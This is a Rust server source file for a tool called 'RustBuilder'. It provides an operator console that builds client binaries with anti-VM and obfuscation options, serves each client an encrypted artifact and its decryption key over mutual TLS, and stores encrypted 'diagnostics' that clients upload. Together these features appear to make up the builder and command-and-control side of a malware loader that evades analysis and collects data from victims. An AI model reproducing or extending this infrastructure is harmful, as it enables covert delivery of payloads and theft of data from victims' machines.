mod ca;
mod db;
mod orchestrator;
mod tls;

use std::net::SocketAddr;
use std::io::{self, Write};
use std::path::PathBuf;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};

use anyhow::{Context, Result};
use axum::extract::{Extension, Path as AxumPath, State};
use axum::http::{HeaderMap, StatusCode};
use axum::response::IntoResponse;
use axum::routing::{get, post};
use axum::{Json, Router};
use clap::{Parser, Subcommand};
use common::proto::{KeyResponse, UploadResponse};
use futures_util::StreamExt;
use rusqlite::Connection;
use tokio::io::AsyncWriteExt;
use uuid::Uuid;

use crate::tls::PeerCn;

#[derive(Parser)]
#[command(name = "server")]
struct Cli {
    #[arg(long, default_value = "data/orchestrator.db", global = true)]
    db: String,

    #[arg(long, default_value = "data", global = true)]
    data_dir: PathBuf,

    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    Console,
    Operator {
        #[command(subcommand)]
        command: OperatorCommands,
    },
    User {
        #[command(subcommand)]
        command: UserCommands,
    },
    Builds {
        #[arg(long, default_value_t = 50)]
        limit: usize,
    },
    Logs {
        #[arg(long, default_value_t = 100)]
        lines: usize,
    },
    Diagnostics {
        #[arg(long)]
        build_id: Option<String>,
    },
    NewBuild {
        #[arg(long)]
        artifact: PathBuf,

        #[arg(long)]
        uid: String,

        #[arg(long, default_value = "https://127.0.0.1:8443")]
        server_url: String,

        #[arg(long)]
        target: Option<String>,

        #[arg(long)]
        no_antivm: bool,

        #[arg(long)]
        debug: bool,

        #[arg(long)]
        obfs: bool,
    },
    Serve {
        #[arg(long, default_value = "127.0.0.1:8443")]
        addr: SocketAddr,

        #[arg(long, default_values_t = [String::from("localhost"), String::from("127.0.0.1")])]
        san: Vec<String>,
    },
}

#[derive(Subcommand)]
enum OperatorCommands {
    Init,
}

#[derive(Subcommand)]
enum UserCommands {
    Create { username: String },
    List,
}

#[derive(Clone)]
struct AppState {
    conn: Arc<Mutex<Connection>>,
    master_key: Arc<[u8; common::sealed::KEY_LEN]>,
    data_dir: Arc<PathBuf>,
}

fn main() -> Result<()> {
    tls::install_crypto_provider();

    let cli = Cli::parse();
    let _log_guard = init_logging(&cli.data_dir)?;
    let passphrase = read_master_passphrase()?;

    let conn = db::open(&cli.db)?;
    db::init_schema(&conn)?;
    let meta = db::load_or_create_meta(&conn, &passphrase, ca::create_ca)?;

    match cli.command {
        Commands::Console => run_console(conn, meta, &cli.data_dir),
        Commands::Operator { command } => match command {
            OperatorCommands::Init => {
                let password = read_operator_password(true)?;
                db::set_operator_password(&conn, &password)?;
                println!("user operator configured");
                Ok(())
            }
        },
        Commands::User { command } => match command {
            UserCommands::Create { username } => {
                if db::any_user_configured(&conn)? || db::operator_configured(&conn)? {
                    require_operator(&conn)?;
                }
                let password = read_operator_password(true)?;
                db::set_user_password(&conn, &username, &password)?;
                println!("user {username} configured");
                Ok(())
            }
            UserCommands::List => {
                require_operator(&conn)?;
                for (username, created_at, enabled) in db::list_users(&conn)? {
                    println!("{username}\t{created_at}\t{}", if enabled { "enabled" } else { "disabled" });
                }
                Ok(())
            }
        },
        Commands::Builds { limit } => {
            require_operator(&conn)?;
            for (id, created_at, status, artifact_path) in db::list_builds(&conn, limit)? {
                println!("{id}\t{created_at}\t{status}\t{artifact_path}");
            }
            Ok(())
        }
        Commands::Logs { lines } => {
            require_operator(&conn)?;
            print_last_lines(&log_path(&cli.data_dir), lines)?;
            Ok(())
        }
        Commands::Diagnostics { build_id } => {
            require_operator(&conn)?;
            list_diagnostics(&cli.data_dir, build_id.as_deref())?;
            Ok(())
        }
        Commands::NewBuild {
            artifact,
            uid,
            server_url,
            target,
            no_antivm,
            debug: debug_build,
            obfs,
        } => {
            require_operator(&conn)?;
            let ca = ca::load_ca(&meta.ca_cert_pem, &meta.ca_key_pem)?;
            let out = orchestrator::new_build(
                &conn,
                &meta.master_key,
                &ca,
                &meta.ca_cert_pem,
                &uid,
                &artifact,
                &server_url,
                &cli.data_dir,
                target.as_deref(),
                no_antivm,
                debug_build,
                obfs,
            )?;
            tracing::info!(build_id = %out.build_id, uid = %uid, no_antivm, debug_build, obfs, "client build created");
            println!("build id:       {}", out.build_id);
            println!("client binary:  {}", out.client_binary.display());
            println!("encrypted file: {}", out.artifact_path.display());
            Ok(())
        }
        Commands::Serve { addr, san } => run_server(meta, conn, cli.data_dir, addr, san),
    }
}

fn run_console(conn: Connection, meta: db::Meta, data_dir: &PathBuf) -> Result<()> {
    require_operator(&conn)?;
    let ca = ca::load_ca(&meta.ca_cert_pem, &meta.ca_key_pem)?;
    let interrupted = Arc::new(AtomicBool::new(false));
    let interrupt_flag = Arc::clone(&interrupted);
    ctrlc::set_handler(move || {
        interrupt_flag.store(true, Ordering::SeqCst);
    })
    .context("failed to install console interrupt handler")?;
    let mut selected_build = None;

    println!("RustBuilder server console");
    println!("Type 'help' for commands. Type 'exit' or 'quit' to leave.");

    loop {
        let prompt = selected_build
            .as_deref()
            .map(|id| format!("server({id})> "))
            .unwrap_or_else(|| "server> ".to_string());
        print!("{prompt}");
        io::stdout().flush().context("failed to flush console prompt")?;

        let mut line = String::new();
        match io::stdin().read_line(&mut line) {
            Ok(0) => {
                println!();
                break;
            }
            Ok(_) => {}
            Err(error) if error.kind() == io::ErrorKind::Interrupted => {
                println!();
                interrupted.store(false, Ordering::SeqCst);
                continue;
            }
            Err(error) => return Err(error.into()),
        }
        if interrupted.swap(false, Ordering::SeqCst) {
            println!();
            continue;
        }
        let line = line.trim();
        if line.is_empty() {
            continue;
        }

        let parts: Vec<&str> = line.split_whitespace().collect();
        match parts[0].to_ascii_lowercase().as_str() {
            "help" | "?" => print_console_help(),
            "exit" | "quit" => break,
            "clear" => print!("\x1b[2J\x1b[H"),
            "use" => {
                let Some(id) = parts.get(1) else {
                    println!("usage: use <build-id>");
                    continue;
                };
                selected_build = Some((*id).to_string());
            }
            "show" => match &selected_build {
                Some(id) => println!("selected build: {id}"),
                None => println!("no build selected"),
            },
            "user" => match parts.get(1).copied() {
                Some("list") => {
                    for (username, created_at, enabled) in db::list_users(&conn)? {
                        println!("{username}\t{created_at}\t{}", if enabled { "enabled" } else { "disabled" });
                    }
                }
                Some("create") => {
                    let Some(username) = parts.get(2) else {
                        println!("usage: user create <username>");
                        continue;
                    };
                    let password = read_operator_password(true)?;
                    db::set_user_password(&conn, username, &password)?;
                    println!("user {username} configured");
                }
                _ => println!("usage: user list | user create <username>"),
            },
            "builds" => {
                let limit = parts
                    .get(1)
                    .and_then(|value| value.parse::<usize>().ok())
                    .unwrap_or(50);
                for (id, created_at, status, artifact_path) in db::list_builds(&conn, limit)? {
                    println!("{id}\t{created_at}\t{status}\t{artifact_path}");
                }
            }
            "logs" => {
                let lines = parts
                    .get(1)
                    .and_then(|value| value.parse::<usize>().ok())
                    .unwrap_or(100);
                print_last_lines(&log_path(data_dir), lines)?;
            }
            "diagnostics" => {
                let id = parts.get(1).copied().or(selected_build.as_deref());
                list_diagnostics(data_dir, id)?;
            }
            "client" | "new-build" => {
                if parts.get(1).copied() != Some("create") && parts[0] == "client" {
                    println!("usage: client create --artifact <file> [--uid <id>] [options]");
                    continue;
                }
                let args = if parts[0] == "client" { &parts[2..] } else { &parts[1..] };
                match parse_console_build_args(args) {
                    Ok((artifact, uid, server_url, target, no_antivm, debug_build, obfs)) => {
                        let uid = uid.unwrap_or_else(|| Uuid::new_v4().to_string());
                        let result = orchestrator::new_build(
                            &conn,
                            &meta.master_key,
                            &ca,
                            &meta.ca_cert_pem,
                            &uid,
                            &artifact,
                            &server_url,
                            data_dir,
                            target.as_deref(),
                            no_antivm,
                            debug_build,
                            obfs,
                        );
                        let out = match result {
                            Ok(out) => out,
                            Err(error) if interrupted.swap(false, Ordering::SeqCst) => {
                                println!("client build cancelled");
                                tracing::debug!(error = %error, "client build interrupted");
                                continue;
                            }
                            Err(error) => return Err(error),
                        };
                        selected_build = Some(out.build_id.clone());
                        tracing::info!(build_id = %out.build_id, uid = %uid, no_antivm, debug_build, obfs, "client build created from console");
                        println!("build id:       {}", out.build_id);
                        println!("client binary:  {}", out.client_binary.display());
                        println!("encrypted file: {}", out.artifact_path.display());
                    }
                    Err(message) => println!("{message}"),
                }
            }
            "listen" => {
                let addr = parts
                    .get(1)
                    .map(|value| value.parse::<SocketAddr>())
                    .transpose()
                    .map_err(|error| anyhow::anyhow!("invalid listen address: {error}"))?
                    .unwrap_or(([127, 0, 0, 1], 8443).into());
                let san = if parts.len() > 2 {
                    parts[2..].iter().map(|value| (*value).to_string()).collect()
                } else {
                    vec!["localhost".to_string(), "127.0.0.1".to_string()]
                };
                println!("starting HTTPS listener on https://{addr}; press Ctrl+C to stop");
                return run_server(meta, conn, data_dir.clone(), addr, san);
            }
            command => println!("unknown command '{command}'; type 'help'"),
        }
    }
    Ok(())
}

fn print_console_help() {
    println!("commands:");
    println!("  help                                  show this help");
    println!("  user list                             list named users");
    println!("  user create <username>                create or update a user");
    println!("  builds [limit]                        list builds");
    println!("  use <build-id>                        select a build");
    println!("  show                                  show selected build");
    println!("  logs [lines]                          show recent server logs");
    println!("  diagnostics [build-id]                list encrypted diagnostics");
    println!("  listen [addr] [san ...]               start the HTTPS listener");
    println!("  client create --artifact <file> [--uid <id>] [options]");
    println!("       --server-url <url> --target <triple> --no-antivm --debug --obfs");
    println!("  clear                                 clear the terminal");
    println!("  exit                                  leave the console");
}

fn parse_console_build_args(
    args: &[&str],
) -> Result<(PathBuf, Option<String>, String, Option<String>, bool, bool, bool), String> {
    let mut artifact = None;
    let mut uid = None;
    let mut server_url = "https://127.0.0.1:8443".to_string();
    let mut target = None;
    let mut no_antivm = false;
    let mut debug = false;
    let mut obfs = false;
    let mut index = 0;
    while index < args.len() {
        match args[index] {
            "--artifact" => {
                index += 1;
                artifact = args.get(index).map(PathBuf::from);
            }
            "--uid" => {
                index += 1;
                uid = args.get(index).map(|value| (*value).to_string());
            }
            "--server-url" => {
                index += 1;
                if let Some(value) = args.get(index) {
                    server_url = (*value).to_string();
                }
            }
            "--target" => {
                index += 1;
                target = args.get(index).map(|value| (*value).to_string());
            }
            "--no-antivm" => no_antivm = true,
            "--debug" => debug = true,
            "--obfs" => obfs = true,
            flag => return Err(format!("unknown option '{flag}'")),
        }
        index += 1;
    }
    let artifact = artifact.ok_or("missing --artifact <file>".to_string())?;
    Ok((artifact, uid, server_url, target, no_antivm, debug, obfs))
}

fn init_logging(data_dir: &PathBuf) -> Result<tracing_appender::non_blocking::WorkerGuard> {
    let log_dir = data_dir.join("logs");
    std::fs::create_dir_all(&log_dir).context("failed to create log directory")?;
    let file = tracing_appender::rolling::never(log_dir, "server.log");
    let (writer, guard) = tracing_appender::non_blocking(file);
    tracing_subscriber::fmt()
        .with_ansi(false)
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| tracing_subscriber::EnvFilter::new("info")),
        )
        .with_writer(writer)
        .init();
    Ok(guard)
}

fn log_path(data_dir: &PathBuf) -> PathBuf {
    data_dir.join("logs").join("server.log")
}

fn require_operator(conn: &Connection) -> Result<()> {
    if !db::any_user_configured(conn)? && !db::operator_configured(conn)? {
        anyhow::bail!("no users configured; run `server user create n0kk`");
    }
    let username = rpassword::prompt_password("Username: ")
        .context("failed to read username")?;
    let password = rpassword::prompt_password("Password: ")
        .context("failed to read password")?;
    let valid = db::verify_user_password(conn, &username, &password)?
        || (username == "operator" && db::verify_operator_password(conn, &password)?);
    if !valid {
        anyhow::bail!("invalid credentials; legacy databases use username `operator`, or reset it with `server operator init`");
    }
    Ok(())
}

fn read_operator_password(confirm: bool) -> Result<String> {
    let password = rpassword::prompt_password("New operator password: ")
        .context("failed to read operator password")?;
    if password.is_empty() {
        anyhow::bail!("operator password cannot be empty");
    }
    if confirm {
        let repeated = rpassword::prompt_password("Repeat operator password: ")
            .context("failed to read operator password confirmation")?;
        if password != repeated {
            anyhow::bail!("operator passwords do not match");
        }
    }
    Ok(password)
}

fn print_last_lines(path: &std::path::Path, lines: usize) -> Result<()> {
    if !path.exists() {
        println!("no log file at {}", path.display());
        return Ok(());
    }
    let content = std::fs::read_to_string(path)
        .with_context(|| format!("failed to read logs from {}", path.display()))?;
    let entries: Vec<_> = content.lines().rev().take(lines).collect();
    for entry in entries.into_iter().rev() {
        println!("{entry}");
    }
    Ok(())
}

fn list_diagnostics(data_dir: &std::path::Path, build_id: Option<&str>) -> Result<()> {
    let root = data_dir.join("diagnostics");
    if let Some(id) = build_id {
        list_diagnostic_dir(&root.join(id))?;
        return Ok(());
    }
    if !root.exists() {
        println!("no diagnostics found");
        return Ok(());
    }
    for entry in std::fs::read_dir(root).context("failed to read diagnostics directory")? {
        let entry = entry?;
        if entry.file_type()?.is_dir() {
            list_diagnostic_dir(&entry.path())?;
        }
    }
    Ok(())
}

fn list_diagnostic_dir(path: &std::path::Path) -> Result<()> {
    if !path.exists() {
        println!("no diagnostics for {}", path.display());
        return Ok(());
    }
    for entry in std::fs::read_dir(path)? {
        let entry = entry?;
        if entry.file_type()?.is_file() {
            println!("{}\t{} bytes", entry.path().display(), entry.metadata()?.len());
        }
    }
    Ok(())
}

fn run_server(
    meta: db::Meta,
    conn: Connection,
    data_dir: PathBuf,
    addr: SocketAddr,
    san: Vec<String>,
) -> Result<()> {
    let runtime = tokio::runtime::Runtime::new()
        .context("failed to create async runtime")?;
    runtime.block_on(run_server_async(meta, conn, data_dir, addr, san))
}

async fn run_server_async(
    meta: db::Meta,
    conn: Connection,
    data_dir: PathBuf,
    addr: SocketAddr,
    san: Vec<String>,
) -> Result<()> {
    let ca = ca::load_ca(&meta.ca_cert_pem, &meta.ca_key_pem)?;
    let server_cert = ca::issue_server_cert(&ca, san)?;
    let acceptor =
        tls::build_acceptor(&meta.ca_cert_pem, &server_cert.cert_pem, &server_cert.key_pem)?;

    let state = AppState {
        conn: Arc::new(Mutex::new(conn)),
        master_key: Arc::new(meta.master_key),
        data_dir: Arc::new(data_dir),
    };

    let app = Router::new()
        .route("/builds/:id/artifact", get(artifact_handler))
        .route("/builds/:id/key", get(key_handler))
        .route("/builds/:id/diagnostics", post(upload_diagnostics_handler))
        .layer(tower_http::compression::CompressionLayer::new().gzip(true))
        .with_state(state);

    tracing::info!("serving on https://{addr} (mTLS required)");
    tracing::info!("TLS acceptor ready; waiting for incoming connections");
    axum_server::bind(addr)
        .acceptor(acceptor)
        .serve(app.into_make_service())
        .await
        .context("server error")?;
    Ok(())
}

fn require_cn(peer: &PeerCn, expected: &str) -> Result<(), StatusCode> {
    match &peer.0 {
        Some(cn) if cn == expected => Ok(()),
        _ => Err(StatusCode::FORBIDDEN),
    }
}

async fn artifact_handler(
    State(state): State<AppState>,
    Extension(peer): Extension<PeerCn>,
    AxumPath(id): AxumPath<String>,
) -> Result<impl IntoResponse, StatusCode> {
    tracing::info!(build_id = %id, "artifact request received");
    require_cn(&peer, &id)?;

    let path = {
        let conn = state.conn.lock().map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        db::get_build_artifact(&conn, &id).map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
    };

    let Some(path) = path else {
        tracing::warn!(build_id = %id, "artifact request for unknown build id");
        return Err(StatusCode::NOT_FOUND);
    };

    tracing::info!(build_id = %id, artifact_path = %path, "serving artifact stream");
    let file = tokio::fs::File::open(&path)
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    let stream = tokio_util::io::ReaderStream::new(file);
    let body = axum::body::Body::from_stream(stream);

    Ok((
        [(axum::http::header::CONTENT_TYPE, "application/octet-stream")],
        body,
    ))
}

async fn key_handler(
    State(state): State<AppState>,
    Extension(peer): Extension<PeerCn>,
    AxumPath(id): AxumPath<String>,
) -> Result<Json<KeyResponse>, StatusCode> {
    tracing::info!(build_id = %id, "key request received");
    require_cn(&peer, &id)?;

    let secret = {
        let conn = state.conn.lock().map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        db::get_build_secret(&conn, &state.master_key, &id)
            .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
    };

    let Some((priv_armored, passphrase, client_cn)) = secret else {
        tracing::warn!(build_id = %id, "key request for unknown build id");
        return Err(StatusCode::NOT_FOUND);
    };

    if client_cn != id {
        tracing::warn!(build_id = %id, expected_client_cn = %client_cn, "mTLS CN mismatch for key request");
        return Err(StatusCode::FORBIDDEN);
    }

    tracing::info!(build_id = %id, "key delivered to authenticated client");
    Ok(Json(KeyResponse {
        build_id: id,
        priv_armored,
        passphrase,
    }))
}

async fn upload_diagnostics_handler(
    State(state): State<AppState>,
    Extension(peer): Extension<PeerCn>,
    AxumPath(id): AxumPath<String>,
    headers: HeaderMap,
    body: axum::body::Body,
) -> Result<Json<UploadResponse>, StatusCode> {
    tracing::info!(build_id = %id, "diagnostic upload request received");
    require_cn(&peer, &id)?;

    let exists = {
        let conn = state
            .conn
            .lock()
            .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        db::get_build_artifact(&conn, &id)
            .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
            .is_some()
    };
    if !exists {
        return Err(StatusCode::NOT_FOUND);
    }

    let raw_name = headers
        .get("x-diagnostic-filename")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("diagnostic");
    tracing::info!(build_id = %id, filename = %raw_name, "receiving diagnostic payload");
    let base = std::path::Path::new(raw_name)
        .file_name()
        .and_then(|n| n.to_str())
        .filter(|s| !s.is_empty())
        .unwrap_or("diagnostic");

    let ts = time::OffsetDateTime::now_utc().unix_timestamp_nanos();
    let filename = format!("{ts}-{base}.pgp");

    let dir = state.data_dir.join("diagnostics").join(&id);
    tokio::fs::create_dir_all(&dir)
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    let dest = dir.join(&filename);

    let file = tokio::fs::File::create(&dest)
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    let mut writer = tokio::io::BufWriter::new(file);

    let mut stream = body.into_data_stream();
    let mut total: u64 = 0;
    while let Some(chunk) = stream.next().await {
        let chunk = chunk.map_err(|_| StatusCode::BAD_REQUEST)?;
        total += chunk.len() as u64;
        writer
            .write_all(&chunk)
            .await
            .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    }
    writer
        .flush()
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    tracing::info!("stored diagnostic for {id}: {filename} ({total} bytes)");

    Ok(Json(UploadResponse {
        build_id: id,
        filename,
        bytes: total,
    }))
}

fn read_master_passphrase() -> Result<String> {
    if let Ok(p) = std::env::var("SERVER_MASTER_PASSPHRASE") {
        return Ok(p);
    }
    rpassword::prompt_password("Server master passphrase: ")
        .context("failed to read master passphrase")
}
